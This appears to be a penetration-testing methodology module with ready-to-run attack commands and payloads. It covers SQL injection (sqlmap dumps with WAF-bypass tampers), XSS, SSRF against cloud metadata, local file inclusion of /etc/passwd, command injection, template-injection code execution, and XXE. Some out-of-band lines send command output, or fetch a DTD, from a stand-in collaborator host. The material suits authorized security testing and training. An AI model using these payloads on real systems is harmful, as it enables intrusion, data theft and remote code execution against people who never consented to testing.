# Module: Input Validation Testing
## Injection & Client-Side Attacks

---

## 3.1 SQL Injection

### Detection
```bash
# Single quote test — look for database errors
curl "https://target.com/page?id=1'"

# Boolean test
curl "https://target.com/page?id=1 AND 1=1"  # True — normal response
curl "https://target.com/page?id=1 AND 1=2"  # False — different response

# Time-based test
curl "https://target.com/page?id=1; SELECT SLEEP(5)"
# OR MSSQL:
curl "https://target.com/page?id=1; WAITFOR DELAY '0:0:5'"
```

### Exploitation (Authorized Testing Only)
```bash
# Automated with sqlmap
sqlmap -u "https://target.com/page?id=1" --dbs --batch
sqlmap -u "https://target.com/page?id=1" -D dbname --tables --batch
sqlmap -u "https://target.com/page?id=1" -D dbname -T users --dump --batch

# POST request
sqlmap -u "https://target.com/login" \
  --data="username=test&password=test" \
  --level=3 --risk=2 --batch

# With cookies (authenticated)
sqlmap -u "https://target.com/profile" \
  --cookie="session=abc123" \
  --level=5 --risk=3 --batch

# WAF bypass tampers
sqlmap -u "https://target.com/page?id=1" \
  --tamper=between,randomcase,space2comment --batch
```

### Load Payloads from File
```bash
# Use payload file
while IFS= read -r payload; do
  url="https://target.com/page?id=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")"
  response=$(curl -s -o /dev/null -w "%{http_code}" "$url")
  echo "$response | $payload"
done < config/payloads/sqli.txt
```

---

## 3.2 Cross-Site Scripting (XSS)

### Reflected XSS
```bash
# Quick check
curl "https://target.com/search?q=<script>alert(1)</script>"

# ffuf fuzzing
ffuf -u "https://target.com/search?q=FUZZ" \
  -w config/payloads/xss.txt \
  -mr "alert|onerror|onload" \
  -of json -o output/xss-reflected.json
```

### Stored XSS
```bash
# Submit in forms, comments, profile fields
# Use unique identifiers to confirm persistence
# Example payload: <img src=x id="xss-ENGAGEMENTID-001" onerror=alert(1)>

# After submission, retrieve the page and check:
curl -s "https://target.com/comments" | grep "xss-ENGAGEMENTID"
```

### DOM-Based XSS
```
# Test URL fragments
https://target.com/#<img src=x onerror=alert(1)>
https://target.com/?q=<img src=x onerror=alert(1)>

# Check JS sources: location.hash, location.search, document.URL
# Check JS sinks: innerHTML, outerHTML, document.write, eval
```

---

## 3.3 Server-Side Request Forgery (SSRF)

```bash
# Test URL parameters for SSRF
# Look for: url=, webhook=, image=, fetch=, callback=, src=

# Basic localhost probe
curl "https://target.com/fetch?url=http://localhost"
curl "https://target.com/fetch?url=http://127.0.0.1"

# AWS Metadata
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"

# Out-of-band detection
curl "https://target.com/fetch?url=http://YOUR-COLLABORATOR-URL/"

# Load from payload file
while IFS= read -r payload; do
  echo "Testing: $payload"
  curl -s "https://target.com/fetch?url=$payload" | head -c 500
  echo "---"
done < config/payloads/ssrf.txt
```

---

## 3.4 Local File Inclusion (LFI)

```bash
# Basic test
curl "https://target.com/page?file=../../../etc/passwd"

# PHP wrapper test
curl "https://target.com/page?file=php://filter/convert.base64-encode/resource=index.php"

# Ffuf fuzzing
ffuf -u "https://target.com/page?file=FUZZ" \
  -w config/payloads/lfi.txt \
  -mr "root:|\\[boot" \
  -of json -o output/lfi-results.json
```

---

## 3.5 Command Injection

```bash
# Test command separators in all input fields
; id
| id
& id
&& id
|| id
`id`
$(id)

# URL encoded
%3B%20id
%7C%20id

# Blind (out-of-band)
; ping -c 1 YOUR-COLLABORATOR-URL
; nslookup YOUR-COLLABORATOR-URL
| curl http://YOUR-COLLABORATOR-URL/?cmd=$(id|base64)

# Common vulnerable parameters
?cmd=, ?exec=, ?command=, ?run=, ?ping=, ?host=
?ip=127.0.0.1; id
?host=target.com; id
```

---

## 3.6 Server-Side Template Injection (SSTI)

```
# Detection payloads (look for mathematical evaluation)
{{7*7}}           → 49 (Jinja2, Twig)
${7*7}            → 49 (Freemarker, Thymeleaf)
<%= 7*7 %>        → 49 (ERB/Ruby)
#{7*7}            → 49 (Ruby)
*{7*7}            → 49 (Spring)
{{7*'7'}}         → 7777777 (Jinja2 specific)

# RCE via Jinja2
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

# RCE via Freemarker
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
```

---

## 3.7 XML External Entity (XXE)

```xml
<!-- Basic XXE -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>

<!-- Blind XXE (out-of-band) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://YOUR-COLLABORATOR-URL/evil.dtd"> %xxe;]>

<!-- XXE via file upload (SVG) -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```

---

## Input Validation Testing Checklist

- [ ] SQL Injection (error, boolean, time-based, UNION)
- [ ] XSS Reflected in all URL parameters and form fields
- [ ] XSS Stored in all persistent input fields
- [ ] DOM-based XSS via URL fragments
- [ ] SSRF in URL/webhook parameters
- [ ] LFI/RFI in file include parameters
- [ ] Command injection in OS interaction parameters
- [ ] SSTI in template-driven parameters
- [ ] XXE in XML/SVG upload or SOAP endpoints
- [ ] CORS misconfiguration
- [ ] Open redirect (url=, redirect=, next=, returnTo=)
